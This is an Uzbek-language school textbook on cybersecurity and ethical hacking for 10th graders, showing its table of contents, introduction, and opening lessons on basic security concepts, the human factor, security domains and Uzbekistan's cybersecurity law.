
OʻZBEKISTON RESPUBLIKASI  RAQAMLI TEXNOLOGIYALAR VAZIRLIGI
	
RAQAMLI TA’LIMNI RIVOJLANTIRISH

“MUHAMMAD AL-XORAZMIY VORISLARI” TIZIMI ASOSIDA TASHKIL ETILADIGAN MAXSUS GURUHLAR UCHUN 
KIBERXAVFSIZLIK (PENETRATION TESTING VA ETHICAL HACKING) YO‘NALISHI BO‘YICHA O‘QUV QO‘LLANMA
(10-SINFLAR UCHUN)

Mazkur o‘quv qo‘llanma Muhammad al-Xorazmiy nomidagi Toshkent axborot texnologiyalari universitetida yaratilgan


Toshkent-2026

MUNDARIJA

Kirish ..........................................................................................
5
I bob.
Kiberxavfsizlikka kirish ...........................................................
9
1.1.
Kiberxavfsizlik asoslari ...............................................................
10
1.2.
Kibertahdidlarning turlari ............................................................
17
1.3.
CIA uchligi ..................................................................................
24
1.4.
Xavfsizlikni anglash tushunchasi ................................................
29
II bob.
Kompyuter tarmoqlari va Internet xavfsizligi .......................
35
2.1.
Tarmoq asoslari ...........................................................................
37
2.2.
Tarmoq qurilmalari va xavfsizlik muammolari ..........................
47
2.3.
IP-manzillash va qism tarmoqlar (subnets) .................................
61
2.4.
Tarmoqlararo ekran va filtrlash ...................................................
70
2.5.
Tarmoqlarda VPN qurish va shifrlash .........................................
75
III bob.
Operatsion tizimlar va fayl xavfsizligi .....................................
82
3.1.
Windows vs Linux xavfsizligi ....................................................
84
3.2.
Fayl tizimlari va foydalanishlarni boshqarish .............................
95
3.3.
Operatsion tizim jurnallari va auditlash ......................................
102
3.4
Foydalanuvchi qayd yozuvi va parollar siyosati .........................
109
IV bob.
Kriptografiya asoslari ...............................................................
119
4.1.
Kriptografiyaga kirish .................................................................
121
4.2.
Simmetrik va ochiq kalitli shifrlash algoritmlari ........................
128
4.3.
Xesh funksiyalar .........................................................................
137
4.4.
Ochiq kalitlar infratuzilmasi .......................................................
143
4.5.
Kriptografik algoritmlardan real hayotda foydalanish .................
148
V bob.
Web xavfsizlik va ethical hacking asoslari .............................
156
5.1.
Web saytlar qanday ishlaydi ....................................................... 
158
5.2.
Keng tarqalgan web zaifliklar .....................................................
167
5.3.
Ethical hacking va qonuniy asoslar .............................................
178
5.4.
Websayt xavfsizligi vositalari .....................................................
187
5.5.
OWASP TOP 10 zaifliklari .........................................................
197
VI bob.
Simsiz tarmoqda suqilib kirish testlarini o‘tkazish .................
203
6.1.
WI-FI xavfsizlik protokollari ......................................................
205
6.2.
Simsiz tarmoqlarga qaratilgan hujumlar .....................................
213
6.3.
Tarmoqni skanerlash usullari ......................................................
218
6.4.
Zaifliklarni baholash ...................................................................
225
6.5.
Parolga qaratilgan hujumlar ........................................................
232
VII bob.
Ijtimoiy muhandislik va inson omili ........................................
241
7.1.
Ijtimoiy muhandislikka kirish .....................................................
243
7.2.
Keng tarqalgan ijtimoiy muhandislik hujumlari .........................
249
7.3.
Internetda shaxsiylik va raqamli iz .............................................
258
VIII bob.
Zararli dasturlar tahlili va undan himoyalanish .....................
268
8.1.
Zararli dastur turlari ....................................................................
270
8.2.
Antivirus va anti-malware vositalari ...........................................
278
8.3.
Sandboxing va ajratish ................................................................
283
8.4.
Ransomware zararli dasturi .........................................................
290
IX bob.
Raqamli kriminalistika va insidentlarga javob berish ............
300
9.1.
Raqamli kriminalistikaga kirish ..................................................
302
9.2.
Raqamli dalillarni saqlash zanjiri ................................................
311
9.3.
Hodisalarni qayta qurish .............................................................
318
9.4.
Xotira kriminalistikasi .................................................................
324
X bob.
Individual va ethical loyihalar .................................................
333
10.1.
Kiberxavfsizlik sohasida karyera va xalqaro sertifikatlar ............
335
10.2.
Loyiha yo‘riqnomasi va axloqiy qoidalar ....................................
340

Glossary ......................................................................................
346

Foydalanilgan adabiyotlar ro‘yxati ..........................................
358
 

KIRISH
Kiberxavfsizlik bugungi raqamli dunyoning eng muhim va eng tez rivojlanayotgan yo‘nalishlaridan biridir. Raqamli infratuzilmalar kengayib borayotgani, sun’iy intellekt, bulutli xizmatlar va IoT qurilmalari hayotimizga chuqur kirib kelayotgani sababli kiberhujumlar soni va murakkabligi ham keskin ortmoqda. Penetration testing va ethical hacking esa ushbu tahdidlarga qarshi kurashishning eng samarali usullaridan bo‘lib, tizimlardagi zaifliklarni oldindan aniqlash va ularni bartaraf etish imkonini beradi. Shu bois, ushbu sohada malakali mutaxassislar yetishmayotgani global muammo bo‘lib qolmoqda. Kiberxavfsizlik bo‘yicha ta’limni rivojlantirish, amaliy ko‘nikmalarni chuqurlashtirish va yosh avlodni ushbu yo‘nalishga keng jalb qilish bugungi kunning ustuvor vazifasidir. Mazkur qo‘llanma ana shu ehtiyojdan kelib chiqib, zamonaviy penetration testing va ethical hacking bo‘yicha tizimli, amaliy hamda o‘quv jarayoniga moslashtirilgan bilim berishni maqsad qiladi.
Ushbu kitob kiberxavfsizlikni endi o‘rgana boshlayotganlar uchun ham, amaliy tajribasini mustahkamlashni istayotgan mutaxassislar uchun ham qo‘llanma vazifasini bajaradi. Unda asosiy nazariy tushunchalar, real hujum ssenariylari, amaliy mashqlar va zamonaviy vositalardan foydalanish bo‘yicha bosqichma-bosqich ko‘rsatmalar jamlangan. Qo‘llanmaning maqsadi - o‘quvchini nafaqat kiberhujumlar qanday amalga oshirilishini tushunadigan, balki ularning oldini olish strategiyalarini ham puxta biladigan professionallarga aylantirishdir.
Qo‘llanmaning birinchi bobida axborot xavfsizligining asosiy tushunchalari, nima uchun kundalik raqamli hayotda kiberxavfsizlikning muhimligi, axborot xavfsizligida inson omili, kibertahdid, uning turlari, amalga oshirishdagi motivatsiyalar, CIA uchligi: konfidensiallik, yaxlitlik, foydalanuvchanlik kabi mavzular bo‘yicha umumiy tushunchalar beriladi. Bundan tashqari, xavfsizlikni taminlash bo‘yicha mutaxassislarni tayyorlash, axborotni himoyalashda tizimli fikrlash, ham hujumchi ham himoyachi kabi fikrlash tushunchalari nazariy va amaliy jihatdan tushuntiriladi.
Qo‘llanmaning ikkinchi bobida tarmoq tushunchasi, uning turlari, tarmoq topologiyalari, OSI va TCP/IP modellari, tarmoq qurilmalari va ularning vazifalari, tarmoqning turli sathlarida xavfsizlik muammolari, IPv4 va IPv6 tarmoq protokoli, IP manzil guruhlari, tarmoqda axborot xavfsizligini ta’minlash vositalari: tarmoqlararo ekran va virtual xususiy tarmoq, ularni vazifalari, turlari, ulardan amalda foydalanish kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.
Uchinchi bobda operatsion tizim tushunchasi, Windows/Linux OT xavfsizlik mexanizmlari, fayl tizimlari, foydalanuvchi turlari, guruhlar, operatsion tizimning hodisalarni qaydlash jurnallari, ular asosida tahdidlarni aniqlash, Windows OT da foydalanuvchilarni yaratish, o‘chirish, ular uchun parollar siyosatini o‘rnatish kabi masalalar bo‘yicha nazariy va amaliy bilimlar berilgan.
To‘rtinchi bobda kriptografiyaning asosiy tushunchalari, zamonaviy kriptografiya bo‘limlari, simmetrik va ochiq kalitli shifrlash algoritmlari, xesh funksiyalar, elektron raqamli imzo algoritmlari, ularning axborot xavfsizligini ta’minashdagi ahamiyati kabi masalalarga to‘xtalib o‘tiladi.
Beshinchi bobda web saytlar qanday ishlashi, web tizimlarda keng tarqalgan zaifliklar, xususan OWASP TOP 10 zaifliklari, etik xakerlik va uning qonuniy asoslarini belgilash, web saytlar xavfsizligini ta’minlashda keng foydalaniluvchi vositalar nazariy va amaliy jihatidan tushuntiriladi.
Oltinchi bobda WI-FI tarmog‘ida foydalaniluvchi xavfsizlik protokollari, simsiz tarmoqlarga qaratilgan hujumlar, tarmoqni skanerlash usullari va vositalari, zaifliklarni baholash, ularning bosqichlari, zarur vositalar, parolga qaratilgan hujumlar haqida nazariy va amaliy ma’lumotlar keltirilgan.
Yettinchi bobda xavfsizlikda psixologik ta’sir etish usullari, mashhur ijtimoiy muhandislik sohasi vakillari, keng tarqalgan ijtimoiy muhandislik hujumlari, Internetda shaxsiy ma’lumotlarni oshkor bo‘lishi holatlari, ularni aniqlash usullari va vositalari, shaxsiy ma’lumotlarni oshkor etmaslik bo‘yicha tavsiyalar keltirilgan.
Sakkizinchi bobda zararli dasturlar, ularni yaratishdan asosiy maqsad, uning yaratilish tarixi, zararli dasturlarning turlari, zararli dasturlarni aniqlash usullari va ularning kamchiliklari, zararli dasturlarni aniqlashning zamonaviy vositalari, virtual mashina texnologiyasi, sandboxing vositalari, ransomware dasturi, uning maqsadi, turlari, tarqalish usullari, ransomware zararli dasturidan himoyalanish usullari, ma’lumotlarni zaxira nusxalash, qayta tiklash usullari haqida ma’lumotlar berilgan.
To‘qqizinchi bobda raqamli kriminalistika asoslari, uning muhimligi, asosiy bosqichlari, raqamli dalillarni saqlash zanjiri, qayd jurnali va vaqt jadvalini tahlillash, xotira kriminalistikasiga oid nazariy va amaliy ma’lumotlar keltirilgan.
So‘ngi bobda kiberxavfsizlik sohasida oid faoliyat sohalari, bu sohada karyerani amalga oshirish, buning uchun talab etiladigan xalqaro sertifikatlar, bilimlar, soha mutaxassislarini tayyorlashda ishlatiladigan amaliy vositalar, CTF musobaqalari, o‘quvchilar tomonidan loyihalarni bajarishda talab etiladigan etikaga oid bilimlar, tartib va qoidalar haqida ma’lumotlar berilgan.

I BOB. KIBERXAVFSIZLIKKA KIRISH
I BOB. KIBERXAVFSIZLIKKA KIRISH




Ta’lim maqsadlari:
	•	kiberxavfsizlik tushunchasini, uning asosiy maqsadlari va kundalik raqamli hayotdagi ahamiyatini ta’riflay oladi;
	•	kiberxavflar turlari (malware, phishing, ransomware, ijtimoiy muhandislik)ni farqlaydi va izohlaydi;
	•	CIA triadasi (maxfiylik, yaxlitlik, foydalanuvchanlik) elementlarini misollar orqali tushuntirib bera oladi;
	•	berilgan real hayotiy ssenariylar asosida phishing va firibgarlik holatlarini aniqlaydi;
	•	turli hujum ssenariylarini (DoS, MITM, malware) toifalarga ajratadi va tasniflaydi;
	•	hujumchi (hacker) va himoyachi (defender) nuqtai nazaridan tizim xavfsizligini tahlil qiladi;
	•	oddiy tizim tekshiruvi orqali zaif parollar va ochiq portlarni aniqlaydi;
	•	aniqlangan xavfsizlik zaifliklarining potensial oqibatlarini baholaydi va ularni kamaytirish yo‘llarini asoslaydi;
	•	raqamli gigiyena qoidalari asosida xavfsiz brauzerlik, kuchli parol yaratish va ijtimoiy tarmoqlarda xavfsiz xatti-harakatlar bo‘yicha amaliy tavsiyalar ishlab chiqadi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Kiberxavfsizlik asoslariga kirish (Введение в основы кибербезопасности) - https://www.coursera.org/learn/introduction-to-cybersecurity-fundamentals
2. Kiberxavfsizlik asoslariga kirish (Введение в основы кибербезопасности) - https://www.coursera.org/learn/introduction-to-cybersecurity-essentials#modules 
1-bob haqida umumiy ma’lumot
Ushbu bobda axborot xavfsizligining asosiy tushunchalari, nima uchun kundalik raqamli hayotda kiberxavfsizlikning muhimligi, axborot xavfsizligida inson omili, kibertahdid, uning turlari, amalga oshirishdagi motivatsiyalar, CIA uchligi: konfidensiallik (Confidentiality), yaxlitlik (Integrity), foydalanuvchanlik (Availability) kabi mavzular bo‘yicha umumiy tushunchalar beriladi. Bundan tashqari, xavfsizlikni taminlash bo‘yicha mutaxassislarni tayyorlash, axborotni himoyalashda tizimli fikrlash, ham hujumchi ham himoyachi kabi fikrlash tushunchalari nazariy va amaliy jihatdan tushuntiriladi.


1.1. Kiberxavfsizlik asoslari  (Ma’ruza mashg‘uloti)
Axborot xavfsizligining asosiy tushunchalari: axborot xavfsizligi, kiberxavfsizlik, kiberjinoyat, kiberqonun, tahdid, aktiv, kiberhujum.
	•	Nima uchun kundalik raqamli hayotda kiberxavfsizlik muhim?
	•	Axborot xavfsizligida inson omili.
	•	Axborot xavfsizligi sohalari.

Reja:
	•	Axborot xavfsizligining asosiy tushunchalari: axborot xavfsizligi, kiberxavfsizlik, kiberjinoyat, kiberqonun, tahdid, aktiv, kiberhujum.
	•	Nima uchun kundalik raqamli hayotda kiberxavfsizlik muhim?
	•	Axborot xavfsizligida inson omili.
	•	Axborot xavfsizligi sohalari.

Reja:

Axborot xavfsizligi, kiberxavfsizlik, kiberjinoyat, kiberqonun, tahdid, aktiv, kiberhujum, inson omili, axborot texnologiyalari, axborot xavfsizligi sohalari.
Kalit so‘zlar:
Axborot xavfsizligi, kiberxavfsizlik, kiberjinoyat, kiberqonun, tahdid, aktiv, kiberhujum, inson omili, axborot texnologiyalari, axborot xavfsizligi sohalari.
Kalit so‘zlar:
Axborot xavfsizligining asosiy tushunchalari: axborot xavfsizligi, kiberxavfsizlik, kiberjinoyat, kiberqonun, tahdid, aktiv, kiberhujum
Axborotni ishlash, uzatish va to‘plashning zamonaviy usullarining rivojlanishi foydalanuvchilar axborotini yo‘qolishi, buzilishi va oshkor etilishi bilan bog‘liq tahdidlarning ortishiga olib kelmoqda. Shu sababli, kompyuter tizimlari va tarmoqlarida axborot xavfsizligini ta’minlash axborot texnologiyalari rivojining yetakchi yo‘nalishlaridan biri hisoblanadi.
Axborot xavfsizligi hayotda mavjud timsollarga asoslanadi. Hayotda qonuniy faoliyat olib boruvchi shaxslar mavjud, ular 1.1-rasmda Alisa va Bob timsolida aks ettirilgan. Biroq, hayotda qonuniy faoliyat yurituvchi insonlarning faoliyatiga qiziquvchi, ularning ishlariga xalaqit beruvchi insonlar ham mavjud va ular  1.1-tasvirda Tridi timsolida tasvirlangan. Tridi timsoli barcha g‘arazli niyatlarni amalga oshiruvchi shaxslarni ifodalaydi.
Kompyuter tizimlari va tarmoqlarida axborotni himoyalash va axborot xavfsizligiga tegishli bo‘lgan ayrim tushunchalar bilan tanishib chiqaylik.
Axborot xavfsizligi – axborotning holati bo‘lib, unga binoan axborotga tasodifan yoki atayin ruxsatsiz ta’sir etishga yoki ruxsatsiz undan foydalanishga yo‘l qo‘yilmaydi. Yoki, axborotni texnik vositalar yordamida ishlanishida uning maxfiylik (konfidensiallik), yaxlitlik va foydalanuvchanlik kabi xarakteristikalari (xususiyatlarini) saqlanishini ta’minlovchi axborotning himoyalanish darajasi holati.

1.1-rasm. Axborot xavfsizligining hayotdagi timsollari
O‘quv qo‘llanmaning keyingi bo‘limlarini yoritishda quyidagi hayotiy senariyni ko‘raylik. Ushbu hayotiy senariy Alisaning onlayn banki (AOB) deb ataladi. Bunga ko‘ra, Alisa onlayn bankning biznes faoliyatini amalga oshiradi. Mazkur senariyda Alisaning xavfsizlik muammosi nima? Alisaning mijozi bo‘lgan Bobning xavfsizlik muammosichi? Alisa va Bobning xavfsizlik muammolari bir xilmi? Tridi nuqtai nazaridan qaraganda qanday xavfsizlik muammolari mavjud? Ushbu savollarga keyingi qismlarda javob berib o‘tiladi.
Axborotni himoyalash – axborot xavfsizligini ta’minlashga yo‘naltirilgan choralar kompleksi. Amalda axborotni himoyalash deganda ma’lumotlarni kiritish, saqlash, ishlash va uzatishda uning yaxlitligini, foydalanuvchanligini va agar kerak bo‘lsa, axborot va resurslarning konfidensialligini madadlash tushuniladi.
Aktiv - himoyalanuvchi axborot yoki resurslar yoki tashkilot uchun qimmatli barcha narsalar. 
Zaiflik – bir yoki bir nechta tahdidlarni amalga oshirishga imkon beruvchi tashkilot aktivi yoki boshqaruv tizimidagi kamchilik.
Kiberjinoyatchilik — axborotni egallash, uni oʻzgartirish, yoʻq qilish yoki axborot tizimlari va resurslarini ishdan chiqarish maqsadida kibermakonda dasturiy taʼminot va texnik vositalardan foydalanilgan holda amalga oshiriladigan jinoyatlar yigʻindisi.
Kibermakon — axborot texnologiyalari yordamida yaratilgan virtual muhit.
Kibertahdid — kibermakonda shaxs, jamiyat va davlat manfaatlariga tahdid soluvchi shart-sharoitlar va omillar majmui.
Kiberxavfsizlik — kibermakonda shaxs, jamiyat va davlat manfaatlarining tashqi va ichki tahdidlardan himoyalanganlik holati.
Kiberhujum — kibermakonda apparat, apparat-dasturiy va dasturiy vositalardan foydalangan holda qasddan amalga oshiriladigan, kiberxavfsizlikka tahdid soladigan harakat.
Kiberqonunlar — bu internet, axborot texnologiyalari va raqamli xizmatlardan foydalanishni tartibga soluvchi qonunlar.
Axborot xavfsizligi va kiberxavfsizlik o‘rtasidagi farq. Axborot xavfsizligi sohasi, axborotning ifodalanishidan qat’iy nazar (qog‘oz ko‘rinishidagi, elektron va insonlar fikrlashida, og‘zaki va vizual) intelektual huquqlarni himoyalash bilan shug‘ullanadi. Kiberxavfsizlik esa elektron shakldagi axborotni (barcha holatdagi, tarmoqdan to qurilmagacha bo‘lgan, o‘zaro birga ishlovchi tizimlarda saqlanayotgan, uzatilayotgan va ishlanayotgan axborotni) himoyalash bilan shug‘ullanadi.
Nima uchun kundalik raqamli hayotda kiberxavfsizlik muhim?
Bugungi kunda axborot texnologiyalari kundalik hayotning barcha jabhalarida muhim rol o‘ynamoqda. Xususan, kompyuterlar, smartfonlar va boshqa raqamli qurilmalardan kundalik hayotda, ishda va o‘qishda keng foydalanilmoqda. Shu bilan birga, bu texnologiyalar foydalanuvchi shaxsiy ma’lumotlarini va moliyaviy resurslarini himoya qilishda katta mas’uliyat yuklaydi. Kiberxavfsizlik bu borada juda muhim ahamiyatga ega. Kiberxavfsizlik nafaqat biznes va davlat tashkilotlari uchun, balki har bir inson uchun ham dolzarb masaladir.
Kundalik hayotda aksariyat holatlarda shaxsiy ma’lumotlar onlayn platformalarda, ijtimoiy tarmoqlarda va boshqa web-saytlarda bo‘lishiladi. Bu ma’lumotlar orasida foydalanuvchilarning ism-shari, tug‘ilgan sanasi, manzili, telefon raqami, elektron pochta manzili va hatto kredit karta ma’lumotlari ham bo‘lishi mumkin. Agar bu ma’lumotlar noto‘g‘ri qo‘llarga tushsa, ular firibgarlik, o‘g‘irlik yoki shaxsiy hayotga tajovuz qilish uchun ishlatilishi mumkin.
Shuningdek, onlayn xaridlarni amalga oshirganda, internet-banking xizmatlaridan foydalanganda yoki soliq deklaratsiyalarini to‘ldirganda ham shaxsiy va moliyaviy ma’lumotlarni himoya qilish zarur hisoblanadi. Bu ma’lumotlarning xavfsizligini ta’minlash uchun ishonchli web-saytlardan foydalanish, kuchli parollarni tanlash va ularni muntazam ravishda yangilash, hamda shubhali havolalarga kirishdan saqlanish talab etiladi.
Korxonalar va tashkilotlar ham kiberxavfsizlikka jiddiy e’tibor qaratishlari kerak. Axborot tizimlaridagi zaifliklar yoki xavfsizlik kamchiliklari sezilarli moliyaviy yo‘qotishlarga, obro‘ga putur yetkazishga va mijozlar ishonchini yo‘qotishga olib kelishi mumkin. Kompaniyalar o‘z tizimlarini himoya qilish uchun tegishli xavfsizlik vositalarini o‘rnatishlari, xodimlarni kiberxavfsizlik bo‘yicha o‘qitishlari va doimiy ravishda tizimlarini tekshirib turishlari zarur.
Davlat organlari ham kiberxavfsizlikni ta’minlashda muhim rol o‘ynaydi. Ular kiberxavfsizlik sohasidagi qonunlarni ishlab chiqish, kiberjinoyatchilikka qarshi kurashish va aholini kiberxavfsizlik bo‘yicha xabardor qilish orqali fuqarolarning onlayn xavfsizligini himoya qilishadi. O‘zbekistonda ham bu borada bir qator chora-tadbirlar ko‘rilmoqda. Xususan, 2022 – yil 15-aprelda «Kiberxavfsizlik to‘g‘risida»gi O‘RQ-764-sonli qonun qabul qilindi. Ushbu qonun axborot texnologiyalari sohasidagi munosabatlarni tartibga soladi, davlat organlari, yuridik va jismoniy shaxslarning huquq va majburiyatlarini belgilaydi.
Qonunga ko‘ra, davlat organlari va boshqa tashkilotlar o‘z axborot tizimlarining xavfsizligini ta’minlashi, kibertahdidlarni aniqlash va ularga qarshi kurashish choralarini ko‘rishi shart. Shuningdek, ular o‘z xodimlarini kiberxavfsizlik sohasida o‘qitishlari va bu boradagi xalqaro hamkorlikni yo‘lga qo‘yishlari kerak.
Jismoniy shaxslar ham o‘z shaxsiy ma’lumotlarini himoya qilishda mas’uldirlar. Ular shaxsiy ma’lumotlarini ehtiyotkorlik bilan boshqalarga berishlari, ishonchli parollardan foydalanishlari va ularni muntazam ravishda yangilashlari tavsiya etiladi. Shuningdek, ular o‘z kompyuterlari va mobil qurilmalarida antivirus dasturlarini o‘rnatishlari va doimiy ravishda yangilab turishlari lozim.
Kiberxavfsizlik sohasidagi huquqbuzarliklar uchun jinoiy va ma’muriy javobgarlik belgilangan. Kiberjinoyatlar orasida kompyuter tizimlaridan ruxsatsiz foydalanish, ma’lumotlarni o‘g‘irlash yoki yo‘q qilish, kompyuter viruslari tarqatish, firibgarlik va boshqalar bor.
Axborot xavfsizligida inson omili
Foydalanuvchilarga kiberxavfsizlik tizimidagi eng zaif nuqta sifatida qaraladi. Foydalanuvchilar tomonidan har qanday yuqori darajadagi xavfsizlik ham buzilishi mumkin.  Masalan, Bob amazon.com onlayn do‘konidan biror narsani sotib olmoqchi, deylik. Buning uchun Bob turli kriptografik usullarga tayanadigan SSL (Secure Sockets Layer) protokoli yordamida Amazon bilan ishonchli bog‘lanish uchun web-brauzerdan foydalanishi mumkin. Ushbu protokol barcha zarur amallar to‘g‘ri bajarilganida kafolatli xavfsizlikni ta’minlaydi. Biroq, ushbu protokolga qaratilgan ba’zi hujum turlari (O‘rtada turgan odam hujumi, Man-in-the-middle attack) mavjudki, ularning amalga oshishi uchun foydalanuvchi “ishtiroki” talab etiladi (1.2-rasm). Agar foydalanuvchi xavfsiz holatni tanlasa (Вернуться к безопасной странице) hujum amalga oshmaydi. Biroq, foydalanuvchi tomonidan xavfsiz bo‘lmagan tanlov (Перейти на сайт …. (небезопасно)) amalga oshirilganida hujum muvaffaqiyatli tugaydi. Boshqacha aytganda, yuqori xavfsizlik darajasiga ega protokoldan foydalanilganda ham foydalanuvchining noto‘g‘ri harakati sababli xavfsizlik buzilishi mumkin. 
Odatda foydalanuvchilar esda saqlash oson bo‘lgan parollardan foydalanishga harakat qiladilar. Biroq, bunday yo‘l tutish buzg‘unchi uchun parollarni taxminlab topish imkoniyatini oshiradi. Boshqa tomondan, murakkab parollardan foydalanish va ularni turli eltuvchilarda saqlash (masalan, qog‘ozda qayd etish) esa, ushbu muammoni yanada kuchaytiradi. 

1.2-rasm. SSL protokolidagi xavfsizlik ogohlantirishi
Bu misollar inson omili tufayli turli joylar va holatlarda xavfsizlik muammolarining kelib chiqishi mumkinligini ko‘rsatadi. Inson omili tufayli yuzaga keladigan xavfsizlik muammolariga ko‘plab misollar keltirish mumkin. Biroq, keltirilgan holatlardagi eng muhim jihat shundaki, xavfsizlik nuqtai nazaridan “tenglamadan” inson omilini olib tashlash zarur. Boshqacha aytganda, inson omili ishtirok etmagan tizimlar ishtirok etgan tizimlarga nisbatan xavfsizroq bo‘ladi.
Axborot xavfsizligi sohalari
Axborot xavfsizligi hozirda quyida beshta sohaga ajratilgan holda o‘rganilmoqda:
	•	Tarmoq xavfsizligi (Network Security);
	•	Ilova xavfsizligi (Application Security);
	•	Ma’lumot xavfsizligi (Data Security);
	•	Qurilma xavfsizligi (Endpoint Security);
	•	Bulut xavfsizligi (Cloud Security).
Tarmoq xavfsizligi (Network Security). Tarmoq xavfsizligi kompyuter tarmog‘i infratuzilmasini ruxsatsiz foydalanish, noto‘g‘ri foydalanish, o‘zgartirish yoki xizmat ko‘rsatishni rad etish (Denial of service, DoS) hujumlaridan himoya qilishga qaratilgan. Bu himoya vositalari — tarmoqlararo ekran (firewall), suqilib kirishlarni aniqlash tizimlari (Intrusion detection systems, IDS), virtual shaxsiy tarmoqlar (Virtual private networks, VPN) va shifrlash protokollari — yordamida amalga oshiriladi.
Tarmoq xavfsizligining maqsadi — maxfiy ma’lumotlardan ruxsatsiz foydalanishni oldini olish hamda tarmoq resurslarining yaxlitligi va foydalanuvchanligini ta’minlashdir.
Ilova xavfsizligi (Application Security). Ilova xavfsizligi dasturiy ta’minot va tizimlarni ularning butun hayotiy sikli davomida — ya’ni loyihalash, ishlab chiqish, joriy etish va texnik xizmat ko‘rsatish bosqichlarida — xavfsizlik zaifliklari va tahdidlardan himoya qilishni anglatadi.
Bu yo‘nalishning asosiy maqsadi — ilovalardagi xavfsizlik kamchiliklarini aniqlash va ularni bartaraf etish orqali ruxsatsiz foydalanish, ma’lumotlar sizib chiqishi va tizimlarning buzilishining oldini olishdir.
Ilova xavfsizligi choralariga quyidagilar kiradi: kodni tekshirish (code review), penetratsion testlar (penetration testing), xavfsizlik testlari va xavfsiz dasturlash amaliyotlari. Bu orqali xakerlar tomonidan ekspluatatsiya xavfi kamaytiriladi.
Ma’lumot xavfsizligi (Data Security). Ma’lumot xavfsizligi — bu ma’lumotlarni ruxsatsiz foydalanish, oshkor qilish, o‘zgartirish yoki yo‘q qilishdan himoya qilishni bildiradi, u ma’lumot uzatilayotgan paytda ham, saqlanayotgan holatda ham amal qiladi.
Bu uchun shifrlash (encryption), foydalanish nazorati (access control), ma’lumotlarni niqoblash (data masking) va ma’lumot yo‘qotilishining oldini olish tizimlari (Data loss prevention, DLP) kabi texnologiyalar qo‘llaniladi.
Ma’lumot xavfsizligining maqsadi — maxfiylik, yaxlitlik va foydalanuvchanlikni ta’minlash hamda kiberxavfsizlik to‘g‘risidagi tegishli qonun talablariga muvofiqlikni saqlashdir.
Qurilma xavfsizligi (Endpoint Security). Qurilma xavfsizligi kompyuterlar, noutbuklar, smartfonlar va boshqa qurilmalarni kiber tahdidlar va zararli faoliyatlardan himoya qilishga qaratilgan.
Bu himoyaga antivirus dasturlari, qurilmani aniqlash va javob tizimlari (Endpoint detection and response, EDR), mobil qurilmalarni boshqarish tizimlari (Mobile device management, MDM) hamda qurilmada shifrlash texnologiyalari kiradi. Ushbu choralar viruslar, zararli dasturlar, fishing hujumlari va ma’lumot sizib chiqishlarining oldini olishga yordam beradi.
Bulut xavfsizligi (Cloud Security). Bulut xavfsizligi — bu bulut muhitida joylashgan ma’lumotlar, ilovalar va infratuzilmani turli xavfsizlik tahdidlari va xatarlaridan himoya qilishga qaratilgan choralardir.
Bulut xavfsizligi kuchli autentifikatsiya, shifrlash, foydalanishni nazoratlash va xavfsizlik monitoringi yordamida amalga oshiriladi. Bu chora-tadbirlar bulutdagi aktivlardan ruxsatsiz foydalanish, ma’lumot sizib chiqishi va xizmat ko‘rsatishdagi uzilishlardan himoya qiladi.
Bulut xavfsizligi, shuningdek, ma’lumot maxfiyligi, me’yoriy moslik (compliance) va bulut xizmat ko‘rsatuvchi bilan foydalanuvchi o‘rtasidagi mas’uliyat taqsimoti masalalarini qamrab oladi. Bu bulut texnologiyalarini xavfsiz va ishonchli tarzda joriy etish hamda ulardan foydalanishni ta’minlaydi.
	Kiberxavfsizlikning asosiy tushunchalariga ta’rif bering?
	•	Axborot xavfsizligining hayotdagi timsollari (Alisa, Bob va Tridi) haqida ma’lumot bering?
	•	Nima uchun kiberxavfsizlikni ta’minlash muhimligini asoslovchi misollar keltiring?
	•	O‘zbekiston Respublikasida qabul qilingan kiberxavfsizlikka oid qonunlar haqida ma’lumot bering?
	•	Axborot xavfsizligini ta’minlashda inson omilining muhimligi haqida ma’lumot bering?
	•	Axborot xavfsizligi sohalari haqida ma’lumot bering?

Nazorat savollari

	•	Kiberxavfsizlikning asosiy tushunchalariga ta’rif bering?
	•	Axborot xavfsizligining hayotdagi timsollari (Alisa, Bob va Tridi) haqida ma’lumot bering?
	•	Nima uchun kiberxavfsizlikni ta’minlash muhimligini asoslovchi misollar keltiring?
	•	O‘zbekiston Respublikasida qabul qilingan kiberxavfsizlikka oid qonunlar haqida ma’lumot bering?
	•	Axborot xavfsizligini ta’minlashda inson omilining muhimligi haqida ma’lumot bering?
	•	Axborot xavfsizligi sohalari haqida ma’lumot bering?

Nazorat savollari

1.2. Kibertahdidlarning turlari  (Ma’ruza mashg‘uloti)
Kibertahdid va uning tasnifi. 
	•	Zararli dasturlar, fishing, to‘lov dasturlari va ijtimoiy muhandislik. 
	•	Kibertahdidlarni amalga oshirishda asosiy maqsad va motivatsiyalar. 
	•	Kibertahdidlar bo‘yicha so‘ngi statistik ma’lumotlar.
Reja:
	•	Kibertahdid va uning tasnifi. 
	•	Zararli dasturlar, fishing, to‘lov dasturlari va ijtimoiy muhandislik. 
	•	Kibertahdidlarni amalga oshirishda asosiy maqsad va motivatsiyalar. 
	•	Kibertahdidlar bo‘yicha so‘ngi statistik ma’lumotlar.
Reja:

Zararli dasturlar, fishing, ransomware, ijtimoiy muhandislik, motivatsiya, kompyuter viruslari, statistik ma’lumotlar.
Kalit so‘zlar
Zararli dasturlar, fishing, ransomware, ijtimoiy muhandislik, motivatsiya, kompyuter viruslari, statistik ma’lumotlar.
Kalit so‘zlar
Kibertahdid va uning tasnifi
So‘nggi yillarda internet texnologiyalari hayotimizning ajralmas qismiga aylandi. Davlat boshqaruvi, ta’lim, sog‘liqni saqlash, bank tizimi va kundalik muloqot kabi sohalarda raqamli yechimlardan keng foydalanilmoqda. Shu bilan birga, internetda faoliyat yuritish ko‘plab xavf va tahdidlarni ham yuzaga keltirmoqda. Internet xavfsizligi masalasi bugun nafaqat texnik, balki ijtimoiy va huquqiy muammo sifatida qaralmoqda.
O‘zbekiston Respublikasi ham bu boradagi global xavflarga qarshi kurashish va axborot xavfsizligini ta’minlash borasida muhim choralarni ko‘rmoqda. Internet orqali sodir etilayotgan firibgarlik, shaxsiy ma’lumotlarni o‘g‘irlash, yolg‘on axborot tarqatish, kiberjinoyatlarning ko‘payishi aholining har bir qatlamini bu tahdidlardan himoyalash zarurligini taqozo etadi.
